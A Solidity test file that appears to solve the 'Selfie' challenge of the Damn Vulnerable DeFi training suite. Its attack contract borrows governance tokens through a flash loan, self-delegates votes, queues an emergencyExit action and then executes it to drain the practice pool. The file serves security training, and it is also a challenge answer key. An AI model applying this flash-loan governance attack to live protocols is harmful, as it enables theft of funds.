// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

/**
 * @title SelfiePool
 * @notice This contract allows flash loans of the token it holds.
 *         It is used in the Selfie attack to drain the SimpleGovernance contract.
 */
// @dev The contract implements the IERC3156FlashLender interface for flash loans.

contract SelfiePoolAttack is IERC3156FlashBorrower {
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    DamnValuableVotes public immutable token;
    SimpleGovernance public immutable governance;
    SelfiePool public immutable pool;
    address public immutable recovery;
    uint256 public actionId;

    constructor(DamnValuableVotes _token, SimpleGovernance _governance, SelfiePool _pool, address _recovery) {
        token = _token;
        governance = _governance;
        pool = _pool;
        recovery = _recovery;
    }

    function callFlashLoan() external {
        // Request a flash loan from the lender
        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), pool.maxFlashLoan(address(token)), "");
    }

    function onFlashLoan(
        address _initiator,
        address _token,
        uint256 _amount,
        uint256 _fee,
        bytes calldata _data
    ) external returns (bytes32) {
        // Ensure the loan is from the correct token
        require(_token == address(token), "Unsupported token");
        require(_initiator == address(this), "Not the initiator");
        require(msg.sender == address(pool), "Not the pool");
        
        // Execute the attack logic here
        // Delegate the call to the governance contract
        token.delegate(address(this));
        uint _actionId = governance.queueAction(
            address(pool),
            0,
            abi.encodeWithSignature("emergencyExit(address)", recovery)
        );

        actionId = _actionId;
        token.approve(address(pool), _amount+_fee);
        return CALLBACK_SUCCESS;

    }  

    function executeProposal() external {
        // Execute the queued action
        governance.executeAction(actionId);
    }

}


contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        // Deploy a new attack contrat
        SelfiePoolAttack  attacker = new SelfiePoolAttack(token, governance, pool, recovery);
        // Start the attack
        attacker.callFlashLoan();
        // Execute the queued action
        vm.warp(block.timestamp + 2 days);
        attacker.executeProposal();
        
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}
